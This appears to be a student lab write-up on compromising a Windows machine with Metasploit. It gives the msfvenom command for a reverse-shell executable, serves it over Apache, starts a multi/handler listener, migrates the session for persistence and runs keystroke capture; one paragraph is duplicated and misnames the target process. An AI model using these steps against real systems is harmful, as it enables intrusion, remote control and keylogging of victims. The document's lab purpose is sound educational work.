# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
192.168.21.149
![image](https://github.com/user-attachments/assets/7b869d60-cb55-450c-81bf-3fd324265234)
Find the attackers ip address using ifconfig
MSFVENOM
![image](https://github.com/user-attachments/assets/e91f1005-56e9-4500-bfa1-ede428bcc227)
Create a malicious executable file fun.exe using msfvenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## copy the fun.exe into apache/var/www/html/
![image](https://github.com/user-attachments/assets/fa061764-517c-4b63-a97a-962e9e58639d)
copy fun.exe start apache server sudosystemctl apache2 start check the status of apache2
## msfconsole
![image](https://github.com/user-attachments/assets/bc82b301-51bd-4311-9ac6-efd91c268bd3)
invoke msfconsole Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
## exploitMultihander,setpayload,exploit
On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Parrot machine
![image](https://github.com/user-attachments/assets/befbca4b-8ca2-4598-b0f7-a289989929ca)

![image](https://github.com/user-attachments/assets/1288bd99-b0c6-4e64-b8ed-125448af34a3)

![image](https://github.com/user-attachments/assets/201deae9-165f-4d68-8d01-4cba4b16eeaa)

![image](https://github.com/user-attachments/assets/3b31b894-1393-42bc-98a6-531c3f4d2c29)

![image](https://github.com/user-attachments/assets/0eb473ef-55c7-404c-8140-c10524f8a6a0)
Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

![image](https://github.com/user-attachments/assets/de3dd753-b571-4296-8abb-5676ded516ee)
The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted
The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted
![image](https://github.com/user-attachments/assets/592091a1-e738-4ca4-b836-e10055b4df3f)

Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![image](https://github.com/user-attachments/assets/25a2a116-7316-4de2-9000-4d0d5bd9cd96)

![image](https://github.com/user-attachments/assets/e8fe9495-53cc-4a5a-b735-4e95f00c8a4f)










## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
